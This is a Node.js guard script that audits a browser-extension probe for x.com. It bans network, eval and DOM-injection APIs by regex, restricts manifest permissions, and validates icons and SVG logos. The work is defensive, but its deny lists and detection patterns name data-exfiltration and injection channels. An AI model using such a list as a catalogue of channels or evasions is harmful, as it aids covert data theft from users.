#!/usr/bin/env node
// xsched gate 0 — the guard: prove the probe never phones home and never asks for power.
//
// It (1) scans every file under probe/ for banned network / DOM-injection / eval APIs and
// (2) checks probe/manifest.json for a minimal, honest permission surface. This script may
// only ever get *stricter*; loosening a rule here is a hard-rule violation.
//
// `npm run verify` → exit 0 when clean, exit 1 (with reasons) otherwise.
// A self-test proves the scanner actually catches a violation on a synthetic probe.

import { mkdtempSync, mkdirSync, readdirSync, readFileSync, rmSync, lstatSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import { inflateSync } from "node:zlib";
import { createHash } from "node:crypto";
import { DOMParser } from "linkedom";
import esprima from "esprima";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const PROBE = join(ROOT, "probe");
const DOCS = join(ROOT, "docs");
// Fail closed: only this exact audited numeric-only position module may persist.
// Any edit requires review and an explicit digest update; filename alone grants nothing.
const POSITION_SOURCE_SHA256 = "7485935c58ef6e3c1ae2db7417deea44e8224ace44c20b9d699da92e15bee335";

// Exact-source exception only for the sole native select input/change writer.
// All other activation, network, storage and markup rules still scan this file.
const QUICK_SOURCE_SHA256 = "f780b40ae0a8a8f4138d2b28fa89d0746146104b47c0536b328187d440d4d25e";

// Owner-authorized exception: one exact DOM factory in root probe/ui.js only.
// Pin both definition and sole call site to full reviewed sources. This prevents
// aliases, fake documents, shadowed bindings and changes to the returned element.
// Any edit to either module requires review before updating these digests.
const AUTHOR_UI_SHA256 = "f019ce6e986ae868e495c8c1ea9253b9b20f683ad65ae8dc4094282fd2acbe66";
const AUTHOR_CONTENT_SHA256 = "37ca32f2f9211967667eae865dc34622314d927d661ed659005339fcb394f74d";
const AUTHOR_LINK_SOURCE = `function createAuthorLink() {
  const link = document.createElement('a');
  if (link.tagName !== 'A') throw new Error('Expected author anchor');
  link.setAttribute('href', 'https://x.com/punkcan');
  link.setAttribute('target', '_blank');
  link.setAttribute('rel', 'noopener');
  link.textContent = '@punkcan';
  return link;
}`;
const AUTHOR_HREF_STATEMENT = "  link.setAttribute('href', 'https://x.com/punkcan');";

// Load the probe's two pure modules (classic scripts → globalThis) so the guard can prove,
// on a hostile synthetic page, that no page content can reach the skeleton or the samples.
let READER;
let SKELETON;
const ICON_SIZES = new Set(["16", "32", "48", "128"]);
const PNG_SIGNATURE = Buffer.from("89504e470d0a1a0a", "hex");

function crc32(bytes) {
  let crc = 0xffffffff;
  for (const byte of bytes) {
    crc ^= byte;
    for (let bit = 0; bit < 8; bit++) crc = (crc >>> 1) ^ ((crc & 1) ? 0xedb88320 : 0);
  }
  return (crc ^ 0xffffffff) >>> 0;
}

// Validate the complete PNG container, CRCs, and decompressed scanline layout;
// checking only the IHDR magic would accept a fake or truncated image.
export function checkPng(bytes, size, label = "icon") {
  const errors = [];
  try {
    if (!bytes.subarray(0, 8).equals(PNG_SIGNATURE)) throw new Error("not a PNG");
    let offset = 8;
    let header;
    let ended = false;
    let palette = false;
    const data = [];
    let dataEnded = false;
    while (offset < bytes.length) {
      if (offset + 12 > bytes.length) throw new Error("truncated PNG chunk");
      const length = bytes.readUInt32BE(offset);
      const end = offset + 12 + length;
      if (end > bytes.length) throw new Error("truncated PNG chunk data");
      const type = bytes.toString("ascii", offset + 4, offset + 8);
      if (!/^[A-Za-z]{4}$/.test(type)) throw new Error("invalid PNG chunk type");
      if (crc32(bytes.subarray(offset + 4, end - 4)) !== bytes.readUInt32BE(end - 4)) throw new Error("invalid PNG CRC");
      const chunk = bytes.subarray(offset + 8, end - 4);
      if (!header && type !== "IHDR") throw new Error("PNG must start with IHDR");
      if (type === "IHDR") {
        if (header || length !== 13) throw new Error("invalid PNG IHDR");
        header = chunk;
      } else if (type === "PLTE") {
        if (palette || data.length || !length || length % 3 || length > 768) throw new Error("invalid PNG palette");
        palette = true;
      } else if (type === "IDAT") {
        if (dataEnded) throw new Error("nonconsecutive PNG IDAT chunks");
        data.push(chunk);
      } else if (type === "IEND") {
        if (length || !data.length || end !== bytes.length) throw new Error("invalid PNG IEND/trailing bytes");
        ended = true;
      } else if (type[0] === type[0].toUpperCase()) {
        throw new Error("unknown critical PNG chunk");
      }
      if (data.length && type !== "IDAT") dataEnded = true;
      offset = end;
    }
    if (!header || !ended) throw new Error("incomplete PNG");
    const width = header.readUInt32BE(0);
    const height = header.readUInt32BE(4);
    if (width !== Number(size) || height !== Number(size)) throw new Error(`PNG dimensions ${width}x${height} must be ${size}x${size}`);
    const depth = header[8];
    const color = header[9];
    const depths = { 0: [1, 2, 4, 8, 16], 2: [8, 16], 3: [1, 2, 4, 8], 4: [8, 16], 6: [8, 16] };
    if (!depths[color]?.includes(depth) || header[10] !== 0 || header[11] !== 0 || header[12] > 1 || (color === 3 && !palette)) throw new Error("invalid PNG encoding");
    const channels = { 0: 1, 2: 3, 3: 1, 4: 2, 6: 4 }[color];
    const passes = header[12] === 0 ? [[0, 0, 1, 1]] : [[0, 0, 8, 8], [4, 0, 8, 8], [0, 4, 4, 8], [2, 0, 4, 4], [0, 2, 2, 4], [1, 0, 2, 2], [0, 1, 1, 2]];
    const rows = [];
    for (const [x, y, dx, dy] of passes) {
      const columns = Math.max(0, Math.ceil((width - x) / dx));
      const count = Math.max(0, Math.ceil((height - y) / dy));
      if (columns) for (let row = 0; row < count; row++) rows.push(1 + Math.ceil(columns * channels * depth / 8));
    }
    const expected = rows.reduce((sum, row) => sum + row, 0);
    const pixels = inflateSync(Buffer.concat(data), { maxOutputLength: expected });
    if (pixels.length !== expected) throw new Error("invalid PNG pixel data length");
    let position = 0;
    for (const row of rows) {
      if (pixels[position] > 4) throw new Error("invalid PNG scanline filter");
      position += row;
    }
  } catch (error) { errors.push(`${label}: ${error.message}`); }
  return errors;
}

export function checkIconMap(icons, label = "icons", dir = PROBE) {
  if (!icons || typeof icons !== "object" || Array.isArray(icons) || !Object.keys(icons).length) return [`${label}: must be a nonempty icon size object`];
  const errors = [];
  for (const [size, path] of Object.entries(icons)) {
    if (!ICON_SIZES.has(size)) { errors.push(`${label}: unsupported icon size ${size}`); continue; }
    // This grammar also excludes schemes, absolute paths, .., percent encoding,
    // backslashes, extra directories, query strings, and fragments.
    if (typeof path !== "string" || !/^icons\/[A-Za-z0-9_-]+\.png$/.test(path)) {
      errors.push(`${label}.${size}: icon path must be icons/*.png inside probe`);
      continue;
    }
    try {
      const folder = lstatSync(join(dir, "icons"));
      const file = lstatSync(join(dir, path));
      if (folder.isSymbolicLink() || !folder.isDirectory() || file.isSymbolicLink() || !file.isFile()) throw new Error("icon must be a regular file in a real icons directory");
      errors.push(...checkPng(readFileSync(join(dir, path)), size, `${label}.${size}`));
    } catch (error) { errors.push(`${label}.${size}: icon file missing or unsafe (${error.message})`); }
  }
  return errors;
}

// A deliberately small vocabulary for these authored, purely geometric logos.
// No CSS/style, animation, embedded HTML, entities, or executable SVG is needed.
export function checkLogoSvg(source, label = "logo") {
  const errors = [];
  if (/<\s*![\s]*(?:DOCTYPE|ENTITY)\b|<\?/i.test(source)) return [`${label}: SVG declarations/processing instructions forbidden`];
  const document = new DOMParser().parseFromString(source, "image/svg+xml");
  const root = document.documentElement;
  if (!root || root.tagName !== "svg" || root.getAttribute("xmlns") !== "http://www.w3.org/2000/svg" || [...document.childNodes].some((node) => node.nodeType === 1 && node !== root)) return [`${label}: must be a single SVG root`];
  const tags = new Set(["svg", "title", "defs", "clipPath", "g", "path", "rect"]);
  const attributes = new Set(["xmlns", "xmlns:xlink", "viewBox", "id", "x", "y", "width", "height", "rx", "ry", "d", "fill", "stroke", "stroke-width", "stroke-linecap", "stroke-linejoin", "stroke-miterlimit", "clip-path", "transform", "href", "xlink:href"]);
  const elements = [root, ...root.querySelectorAll("*")];
  const ids = new Set(elements.map((element) => element.getAttribute("id")).filter(Boolean));
  for (const element of elements) {
    if (!tags.has(element.tagName)) errors.push(`${label}: forbidden SVG element ${element.tagName}`);
    for (const { name, value } of element.attributes) {
      if (/^on/i.test(name) || !attributes.has(name)) { errors.push(`${label}: forbidden SVG attribute ${name}`); continue; }
      if (name === "xmlns" || name === "xmlns:xlink") {
        const expected = name === "xmlns" ? "http://www.w3.org/2000/svg" : "http://www.w3.org/1999/xlink";
        if (value !== expected) errors.push(`${label}: unexpected namespace`);
        continue;
      }
      if (value.includes("\\")) { errors.push(`${label}: SVG escape sequences forbidden`); continue; }
      if (name === "href" || name === "xlink:href") {
        if (!/^#[A-Za-z_][\w.-]*$/.test(value) || !ids.has(value.slice(1))) errors.push(`${label}: external or unresolved SVG href`);
      } else if (/url\s*\(/i.test(value)) {
        const local = /^url\(\s*(["']?)#([A-Za-z_][\w.-]*)\1\s*\)$/.exec(value);
        if (!local || !ids.has(local[2])) errors.push(`${label}: external or unresolved SVG url reference`);
      } else if (/[a-z][\w+.-]*:|\/\//i.test(value)) errors.push(`${label}: external SVG reference`);
    }
  }
  return errors;
}

export function checkLogoDir(dir = DOCS) {
  const names = readdirSync(dir).filter((name) => /^xsched-logo-B.*\.svg$/.test(name));
  const required = ["xsched-logo-B.svg", "xsched-logo-B-black-on-light.svg", "xsched-logo-B-white-on-dark.svg", "xsched-logo-B-accent-icon.svg"];
  const errors = required.filter((name) => !names.includes(name)).map((name) => `docs/${name}: missing logo`);
  for (const name of names) {
    const file = join(dir, name);
    if (lstatSync(file).isSymbolicLink() || !lstatSync(file).isFile()) errors.push(`docs/${name}: logo must be a regular file`);
    else errors.push(...checkLogoSvg(readFileSync(file, "utf8"), `docs/${name}`));
  }
  return { errors, scanned: names.length };
}

// One table keeps forbidden content attributes and reflected IDL writes aligned.
// Retain the original eight attributes; add attribution/legacy background/request
// policy and inline iframe HTML. A name here grants no factory exception: only
// its digest-locked href statement gets the existing resource-attribute exemption.
const RESOURCE_ATTRIBUTE_IDL = {
  src: 'src', href: 'href', srcset: 'srcset', action: 'action',
  poster: 'poster', data: 'data', ping: 'ping', formaction: 'formAction',
  attributionsrc: 'attributionSrc', background: 'background',
  referrerpolicy: 'referrerPolicy', srcdoc: 'srcdoc',
};
const URL_COMPONENT_PROPERTIES = ['href', 'search', 'hostname', 'host', 'pathname', 'protocol', 'port', 'hash', 'origin', 'username', 'password'];
const PROTECTED_WRITE_PROPERTIES = [...new Set([...URL_COMPONENT_PROPERTIES, ...Object.values(RESOURCE_ATTRIBUTE_IDL)])];
const resourceAttributeRule = pattern => new RegExp(pattern.source.replace('RESOURCE_ATTRIBUTES', Object.keys(RESOURCE_ATTRIBUTE_IDL).join('|')), pattern.flags);

// Things the probe must never contain. (Whole probe/ tree, any file type.)
const BANNED = [
  { name: "native event dispatch outside audited writer", re: /\bdispatchEvent\b/ },
  { name: "activation event constructors/aliases", re: /\b(?:MouseEvent|PointerEvent|KeyboardEvent|SubmitEvent)\b/ },
  { name: "form submission/aliases", re: /\brequestSubmit\b|\.\s*submit\b/ },
  { name: "click alias", re: /\.\s*click\b/ },
  // Dot/bracket checks alone miss destructuring and reflected method extraction.
  // Match the same static property names after comment removal/string folding.
  { name: "activation method extraction", re: /\{[^{};]*\b(?:click|submit)["']?\s*(?=[:,}])|\.\s*(?:get|getOwnPropertyDescriptor)\s*\([^;]*["'](?:click|submit)["']/ },
  { name: "activation handler alias", re: /\.\s*on(?:click|submit)\b/ },
  { name: "namespaced resource attribute", re: resourceAttributeRule(/\.\s*setAttributeNS\s*\(\s*(?:null|["'`][^"'`]*["'`])\s*,\s*["'`](?:RESOURCE_ATTRIBUTES)["'`]/i) },
  { name: "markup parsing", re: /\b(?:createContextualFragment|parseFromString)\b/ },
  { name: "fetch(", re: /\bfetch\s*\(/ },
  { name: "XMLHttpRequest", re: /XMLHttpRequest/ },
  { name: "WebSocket", re: /\bWebSocket\b/ },
  { name: "sendBeacon", re: /sendBeacon/ },
  { name: "EventSource", re: /\bEventSource\b/ },
  { name: "innerHTML", re: /innerHTML/ },
  { name: "outerHTML=", re: /outerHTML\s*=/ },
  { name: "insertAdjacentHTML", re: /insertAdjacentHTML/ },
  { name: "document.write", re: /document\s*\.\s*write/ },
  { name: "eval(", re: /\beval\s*\(/ },
  { name: "new Function", re: /new\s+Function/ },
  { name: "importScripts", re: /importScripts/ },
  { name: "chrome.debugger", re: /chrome\s*\.\s*debugger/ },
  { name: "webRequest", re: /webRequest/ },
  { name: "fetch name/alias", re: /\bfetch\b/ },
  { name: "outerHTML", re: /outerHTML/ },
  { name: "eval name/alias", re: /\beval\b/ },
  { name: "Function constructor/alias", re: /\bFunction\b/ },
  { name: "history patch/navigation", re: /\b(?:pushState|replaceState)\b/ },
  { name: "persistent storage", re: /\b(?:localStorage|sessionStorage|indexedDB)\b|\bchrome\s*\.\s*storage\b/ },
  { name: "storage accessor/alias", re: /\b(?:getItem|setItem|removeItem)\b/ },
  { name: "programmatic click/scroll", re: /\.\s*(?:click|scroll|scrollBy|scrollTo|scrollIntoView)\s*\(|\.\s*(?:scrollTop|scrollLeft)\s*=/ },
  { name: "resource URL/sink", re: /\b(?:src|href|srcset)\s*=|\burl\s*\(/i },
  { name: "resource attribute", re: resourceAttributeRule(/\.\s*setAttribute\s*\(\s*["'`](?:RESOURCE_ATTRIBUTES)["'`]/i) },
  { name: "CSS import", re: /@import\b/i },
  { name: "network-capable constructors/workers", re: /\b(?:Image|Audio|Worker|SharedWorker|RTCPeerConnection|WebTransport)\b|\bserviceWorker\b/ },
  { name: "remote import", re: /\bimport\s*\(\s*["'`]\s*(?:https?:|\/\/)/ },
];

// Conservative extra view, never a replacement for scanning the original source.
// Decode escaped identifiers/strings, remove comments, fold literal concatenation,
// then normalize constant bracket properties. This is a guard, not a JS sandbox.
function canonicalSource(source) {
  // Preserve quoted literals: the // in an earlier URL must not hide later code.
  let text = source.replace(/("(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`)|(\/\*[\s\S]*?\*\/|\/\/[^\n\r]*)/g,
    (match, literal) => literal || " ");
  text = text.replace(/\\u\{([0-9a-f]{1,6})\}|\\u([0-9a-f]{4})|\\x([0-9a-f]{2})/gi,
    (match, wide, unicode, hex) => {
      const code = parseInt(wide || unicode || hex, 16);
      return code <= 0x10ffff ? String.fromCodePoint(code) : match;
    });
  const concat = /(["'`])([^"'`\\\n]*)\1\s*\+\s*(["'`])([^"'`\\\n]*)\3/g;
  for (let previous; previous !== text;) {
    previous = text;
    text = text.replace(concat, (_, a, left, b, right) => `"${left}${right}"`);
  }
  return text.replace(/\[\s*(["'`])([\w$]+)\1\s*\]/g, ".$2");
}

// Entry-independent: a CSS resource value is forbidden regardless of whether
// it reaches setProperty, cssText, a style property/attribute, or a stylesheet.
// Retain the original url()/@import rules; this additional view also covers CSS
// escapes inside cooked JS strings and literal concatenations/templates.
const CSS_RESOURCE_FUNCTIONS = ['url', 'src', 'image', 'image-set', '-webkit-image-set', 'cross-fade', '-webkit-cross-fade', 'element', '-moz-element', 'paint', '-webkit-canvas'];
const CSS_RESOURCE_VALUE = new RegExp(`(?:^|[^\\w-])(?:${CSS_RESOURCE_FUNCTIONS.join('|')})\\s*\\(|@import\\b`, 'i');
function cssDecoded(source) {
  return source.replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/\\(?:\r\n|[\n\r\f])/g, '')
    .replace(/\\([0-9a-f]{1,6})(?:\r\n|[\t\n\r\f ])?|\\([^\n\r\f])/gi, (escape, hex, character) => {
      if (!hex) return character;
      const code = parseInt(hex, 16);
      return !code || code > 0x10ffff || (code >= 0xd800 && code <= 0xdfff) ? '\ufffd' : String.fromCodePoint(code);
    });
}

function checkCssResources(source, label) {
  const views = [source, canonicalSource(source)];
  if (label.endsWith('.js')) {
    try {
      const tokens = esprima.tokenize(source);
      // Parse only isolated literal tokens, never execute them or feed modern
      // production JS into Esprima's older full parser. Tagged templates may
      // use raw text, so scan both raw and cooked literal fragments.
      let raw = '', cooked = '';
      const flush = () => { views.push(raw, cooked); raw = ''; cooked = ''; };
      for (const token of tokens) {
        if (token.type === 'String') {
          const value = esprima.parseScript(token.value).body[0].expression.value;
          views.push(value);
          raw += value;
          cooked += value;
        } else if (token.type === 'Template') {
          const fragment = token.value.slice(1, token.value.endsWith('`') ? -1 : -2);
          const value = esprima.parseScript('`' + fragment + '`').body[0].expression.quasis[0].value.cooked;
          views.push(fragment, value ?? fragment);
          raw += fragment;
          cooked += value ?? fragment;
        } else if (token.type !== 'Punctuator' || !['+', '(', ')'].includes(token.value)) flush();
      }
      flush();
    } catch {
      return [`${label}: CSS literal analysis failed closed`];
    }
  }
  return views.some(view => CSS_RESOURCE_VALUE.test(view) || CSS_RESOURCE_VALUE.test(cssDecoded(view)))
    ? [`${label}: CSS image/resource value forbidden`] : [];
}

// content_scripts may only touch X itself over https.
const ALLOWED_MATCHES = new Set([
  "https://x.com/*",
  "https://twitter.com/*",
  "https://www.x.com/*",
  "https://www.twitter.com/*",
]);

function listFiles(dir, base = dir) {
  const out = [];
  for (const name of readdirSync(dir)) {
    const full = join(dir, name);
    if (lstatSync(full).isSymbolicLink()) throw new Error(`symlink forbidden in probe: ${full}`);
    if (lstatSync(full).isDirectory()) out.push(...listFiles(full, base));
    else out.push(full);
  }
  return out;
}

// Esprima's tokenizer handles the probe's modern operators without attempting
// its older ES2017 parser. Work on original tokens, never canonicalized code:
// comments, strings, regex literals and templates cannot fake delimiters.
// This deliberately rejects even member reads in destructuring defaults/keys.
// No reviewed source needs them; a new pattern requires review, not an exception.
function checkDestructuring(source, label) {
  let tokens;
  try { tokens = esprima.tokenize(source); }
  catch (error) { return [`${label}: JS tokenization failed: ${error.message}`]; }
  const groups = [], stack = [];
  const opening = new Set(['(', '[', '{']);
  const matching = { ')':'(', ']':'[', '}':'{' };
  for (let index = 0; index < tokens.length; index++) {
    const token = tokens[index];
    if (token.type !== 'Punctuator') continue;
    if (opening.has(token.value)) {
      const group = { start:index, kind:token.value, parent:stack.at(-1) };
      groups.push(group); stack.push(group);
    } else if (matching[token.value]) {
      const group = stack.pop();
      if (!group || group.kind !== matching[token.value]) return [`${label}: unbalanced JS delimiters`];
      group.end = index;
    }
  }
  if (stack.length) return [`${label}: unbalanced JS delimiters`];
  const errors = new Set();
  for (const group of groups) {
    if (group.kind === '(') continue;
    let after = group.end + 1;
    while (tokens[after]?.value === ')' && tokens[after]?.type === 'Punctuator') after++;
    let pattern = ['=', 'of', 'in'].includes(tokens[after]?.value);
    // Destructured parameters (functions/methods/arrows/catch) may have no '='.
    for (let parent = group.parent; !pattern && parent; parent = parent.parent) {
      if (parent.kind !== '(') continue;
      const next = tokens[parent.end + 1]?.value;
      const before = tokens[parent.start - 1]?.value;
      if (next === '=>' || (next === '{' && !['if', 'while', 'switch', 'with', 'for'].includes(before))) pattern = true;
    }
    if (!pattern) continue;
    for (let index = group.start + 1; index < group.end; index++) {
      const token = tokens[index], previous = tokens[index - 1];
      if (token.type === 'Identifier' && ['document', 'createElement'].includes(canonicalSource(token.value))) errors.add(`${label}: destructuring document/createElement forbidden`);
      if (token.type === 'Punctuator' && (token.value === '.' || (token.value === '[' &&
          (['Identifier', 'String', 'Numeric', 'Boolean', 'Null', 'RegularExpression', 'Template'].includes(previous?.type) || [')', ']', '}', 'this', 'super'].includes(previous?.value))))) errors.add(`${label}: destructuring member access forbidden`);
    }
  }
  return [...errors];
}

export function scanSource(text, label, { positionModule = false, quickModule = false } = {}) {
  const errors = [];
  const digest = createHash('sha256').update(text).digest('hex');
  const auditedQuick = quickModule && label === 'probe/quick.js' && digest === QUICK_SOURCE_SHA256;
  // Main 0.1.1 writes the field map through a nested computed index, not a
  // destructuring target. Omit only this statement in the exact audited module;
  // changed/renamed sources and all other statements retain the original guard.
  const destructuringSource = auditedQuick ? text.replace('fields[choices[0]]=select;', '') : text;
  if (label.endsWith('.js')) errors.push(...checkDestructuring(destructuringSource, label));
  errors.push(...checkCssResources(text, label));
  const auditedAuthorUi = label === 'probe/ui.js' && digest === AUTHOR_UI_SHA256;
  const auditedAuthorContent = label === 'probe/content.js' && digest === AUTHOR_CONTENT_SHA256;
  if ((label === 'probe/ui.js' && !auditedAuthorUi) || (label === 'probe/content.js' && !auditedAuthorContent)) errors.push(`${label}: author definition/call site differs from reviewed source`);
  const checked = auditedAuthorUi
    ? text.replace(AUTHOR_LINK_SOURCE, AUTHOR_LINK_SOURCE.replace(AUTHOR_HREF_STATEMENT, ''))
    : text;
  const canonical = canonicalSource(text);
  const checkedCanonical = canonicalSource(checked);
  const auditedPosition = positionModule && createHash('sha256').update(text).digest('hex') === POSITION_SOURCE_SHA256;
  if (quickModule && !auditedQuick) errors.push(`${label}: native writer differs from audited input/change-only boundary`);
  if (positionModule && !auditedPosition) errors.push(`${label}: position module differs from audited numeric-only storage boundary`);
  // Additional rules only: original raw/canonical checks below remain unchanged.
  // Bracket literals/escapes/concatenations are normalized before these checks.
  const writeOperator = String.raw`(?:[+\-*/%&|^<>?]*=(?!=|>)|\+\+|--)`;
  const targetEnd = String.raw`(?:[)}\]\s]*|(?:\s*,\s*(?:[\w$]+\s*:\s*)?[\w$.]+\s*)+[)}\]\s]*)`;
  const component = `(${PROTECTED_WRITE_PROPERTIES.join('|')})`;
  const componentWrite = new RegExp(String.raw`\.\s*${component}\b\s*(?:${targetEnd}${writeOperator}|[)}\]\s]*\b(?:of|in)\b)|(?:\+\+|--|delete\b)[^;]*?\.\s*${component}\b`, 'gi');
  const writeKinds = new Set();
  for (const propertyWrite of canonical.matchAll(componentWrite)) {
    const property = (propertyWrite[1] || propertyWrite[2]).toLowerCase();
    writeKinds.add(URL_COMPONENT_PROPERTIES.includes(property) ? 'URL component' : 'resource property');
  }
  for (const kind of writeKinds) errors.push(`${label}: ${kind} write forbidden`);
  // A forbidden IDL write must not be laundered through an extracted DOM
  // attribute setter or a runtime attribute name. Allow direct, fixed safe
  // names only; the existing SVG-key loop is safe in the digest-locked content.
  let attributeMethods = checkedCanonical;
  if (auditedAuthorContent) attributeMethods = attributeMethods.replace('path.setAttribute(key, value);', '');
  const safeAttributeCall = (call, quote, name) => Object.hasOwn(RESOURCE_ATTRIBUTE_IDL, name.toLowerCase()) ? call : '';
  attributeMethods = attributeMethods
    .replace(/\.\s*setAttribute\s*\(\s*(["'`])([\w:-]+)\1\s*,/g, safeAttributeCall)
    .replace(/\.\s*setAttributeNS\s*\(\s*(?:null|["'`][^"'`]*["'`])\s*,\s*(["'`])([\w:-]+)\1\s*,/g, safeAttributeCall);
  if (/\b(?:setAttribute|setAttributeNS|setAttributeNode|setAttributeNodeNS|setNamedItem|setNamedItemNS)\b/.test(attributeMethods)) errors.push(`${label}: dynamic/extracted attribute mutation forbidden`);
  // Methods and aliases are forbidden regardless of the receiver or property
  // spelling. Preserve only the existing fixed Scheduled navigation and the
  // exact audited native-select setter read; neither permits URL mutation.
  let writes = canonical.replace(/\blocation\.assign\(["']https:\/\/x\.com\/compose\/post\/unsent\/scheduled["']\)/g, '');
  if (auditedQuick) writes = writes.replace("Object.getOwnPropertyDescriptor(doc.defaultView.HTMLSelectElement.prototype,'value')", '');
  if (/\b(?:Reflect|assign|defineProperty|defineProperties|setPrototypeOf|getOwnPropertyDescriptor|getOwnPropertyDescriptors|__defineSetter__|__defineGetter__|__lookupSetter__|__proto__)\b/.test(writes)) errors.push(`${label}: reflective property mutation/extraction forbidden`);
  // Unknown computed keys could name any URL component. The only existing
  // dynamic writes are the digest-locked native select map and DOM dataset keys.
  const dynamicWrites = writes.replace(auditedAuthorContent ? 'button.dataset[datasetKey] = "1";' : /$^/, '');
  if (!auditedQuick && new RegExp(String.raw`\]\s*${targetEnd}${writeOperator}|(?:\+\+|--|delete\b)[^;]*?\[[^;]*?\]|\b(?!const\b|let\b|var\b)[\w$.]+\s*\[[^\]]+\][)}\]\s]+(?:of|in)\b`).test(dynamicWrites)) errors.push(`${label}: dynamic property write forbidden`);
  // A top-level destructured binding can shadow the isolated world's document
  // too (including when another field follows it). Fail closed on these binding
  // patterns; inspecting only a scalar `document = ...` misses that case.
  if (new RegExp(String.raw`\b(?:document|createElement)\s*(?:${targetEnd}${writeOperator}|[)}\]\s]*\b(?:of|in)\b)|\b(?:const|let|var|function|class)\s+document\b|\b(?:const|let|var)\s*[\[{][^;]*\bdocument\b`).test(canonical)) errors.push(`${label}: document/element factory mutation forbidden`);
  if (/\b(?:createAuthorLink|XSCHED_UI)\b/.test(canonical) && !auditedAuthorUi && !auditedAuthorContent) errors.push(`${label}: author factory references are restricted to reviewed UI/content`);
  for (const rule of BANNED) {
    if (auditedQuick && rule.name === "native event dispatch outside audited writer") continue;
    if (auditedPosition && ['persistent storage','storage accessor/alias'].includes(rule.name)) continue;
    const authorAttribute = rule.name === 'resource attribute';
    if (rule.re.test(authorAttribute ? checked : text) || rule.re.test(authorAttribute ? checkedCanonical : canonical)) errors.push(`${label}: contains banned API "${rule.name}"`);
  }
  const navigation = canonical.replace(/\blocation\.assign\(["']https:\/\/x\.com\/compose\/post\/unsent\/scheduled["']\)/g, "");
  if (/\blocation\s*(?:=|\.\s*(?:assign|replace)\s*\(|\.\s*(?:href|pathname|search|hash)\s*=)/.test(navigation)) errors.push(`${label}: only the fixed Scheduled navigation is allowed`);
  if (/\bimport\s*\(/.test(canonical)) errors.push(`${label}: dynamic import forbidden`);
  return errors;
}

export function checkManifest(manifest, label = "probe/manifest.json", dir = PROBE) {
  const errors = [];
  if (manifest.manifest_version !== 3) errors.push(`${label}: manifest_version must be 3`);
  const keys = new Set(["manifest_version", "name", "version", "description", "content_scripts", "icons", "action"]);
  for (const key of Object.keys(manifest)) {
    if (!keys.has(key)) errors.push(`${label}: unexpected manifest field "${key}"`);
  }
  if (Object.hasOwn(manifest, "icons")) errors.push(...checkIconMap(manifest.icons, `${label}.icons`, dir));
  if (Object.hasOwn(manifest, "action")) {
    const action = manifest.action;
    if (!action || typeof action !== "object" || Array.isArray(action) || !Object.hasOwn(action, "default_icon")) errors.push(`${label}: action must contain only default_icon`);
    else {
      for (const key of Object.keys(action)) if (key !== "default_icon") errors.push(`${label}: unexpected action field ${key}`);
      errors.push(...checkIconMap(action.default_icon, `${label}.action.default_icon`, dir));
    }
  }

  if (Array.isArray(manifest.permissions) && manifest.permissions.length > 0) {
    errors.push(`${label}: permissions must be empty/absent, found ${JSON.stringify(manifest.permissions)}`);
  }
  if (manifest.permissions !== undefined && !Array.isArray(manifest.permissions)) {
    errors.push(`${label}: permissions must be an array when present`);
  }
  for (const key of ["host_permissions", "optional_host_permissions", "optional_permissions", "web_accessible_resources", "externally_connectable", "sandbox", "declarative_net_request"]) {
    if (manifest[key] !== undefined) errors.push(`${label}: "${key}" is not allowed`);
  }
  if (manifest.content_security_policy !== undefined) {
    errors.push(`${label}: content_security_policy override is not allowed`);
  }

  const entries = manifest.content_scripts;
  if (!Array.isArray(entries) || entries.length === 0) {
    errors.push(`${label}: content_scripts must be a non-empty array`);
  } else {
    for (const entry of entries) {
      if (!entry || typeof entry !== "object") { errors.push(`${label}: malformed content_scripts entry`); continue; }
      if (entry.world !== undefined && entry.world !== "ISOLATED") {
        errors.push(`${label}: content_scripts world must be ISOLATED (found ${entry.world})`);
      }
      for (const key of Object.keys(entry)) {
        if (!["matches", "js", "run_at", "world"].includes(key)) errors.push(`${label}: unexpected content_scripts field "${key}"`);
      }
      const matches = Array.isArray(entry.matches) ? entry.matches : [];
      if (matches.length === 0) errors.push(`${label}: content_scripts.matches must not be empty`);
      for (const pattern of matches) {
        if (!ALLOWED_MATCHES.has(pattern)) {
          errors.push(`${label}: content_scripts.matches "${pattern}" is not x.com/twitter.com`);
        }
      }
      if (!Array.isArray(entry.js) || !entry.js.length || entry.js.some((path) => typeof path !== "string" || !/^[\w-]+\.js$/.test(path))) {
        errors.push(`${label}: js must name local probe scripts`);
      }
    }
  }
  return errors;
}

// Check a whole probe directory (default: the real one).
export function checkProbeDir(dir) {
  const errors = [];
  if (!existsSync(join(dir, "manifest.json"))) errors.push("probe/manifest.json: missing manifest");
  const files = listFiles(dir);
  let scanned = 0;
  for (const file of files) {
    const rel = relative(ROOT, file);
    const text = readFileSync(file, "utf8");
    scanned += 1;
    errors.push(...scanSource(text, rel, { positionModule: relative(dir,file) === 'position.js', quickModule:relative(dir,file) === 'quick.js' }));
    if (file.endsWith("manifest.json") || /[\\/]manifest\.json$/.test(file)) {
      let manifest;
      try {
        manifest = JSON.parse(text);
      } catch (err) {
        errors.push(`${rel}: not valid JSON (${err.message})`);
        continue;
      }
      errors.push(...checkManifest(manifest, rel, dir));
      for (const entry of manifest.content_scripts || []) {
        for (const script of Array.isArray(entry?.js) ? entry.js : []) {
          if (!existsSync(join(dir, script))) errors.push(`${rel}: missing script ${script}`);
        }
      }
    }
  }
  return { errors, scanned };
}

// Structural vocabulary a skeleton legitimately prints (tags, kept attribute names, the
// header/trailer words). A secret fragment that coincides with one of these is not a leak.
const LEAK_VOCAB = [
  "role", "data-testid", "aria-selected", "aria-hidden", "aria-expanded", "aria-checked",
  "aria-current", "aria-modal", "aria-live", "dir", "type", "tabindex", "data-focusable",
  "class", "id", "href", "src", "title", "alt", "placeholder", "aria-label", "aria-description",
  "aria-valuetext", "data-renderkey", "input", "c", "x", "#text", "#shadow",
  "#iframe", "origin", "xsched-skeleton", "path", "scheduled", "other", "nodes", "TRUNCATED",
  "depth", "div", "span", "body", "html", "section", "article", "main", "aside", "header",
  "footer", "ul", "li", "p", "a", "hr", "br", "img", "svg", "path", "use",
].join(" ");
const LEAK_ALLOWED = new Set();
for (let i = 0; i + 4 <= LEAK_VOCAB.length; i += 1) LEAK_ALLOWED.add(LEAK_VOCAB.slice(i, i + 4));

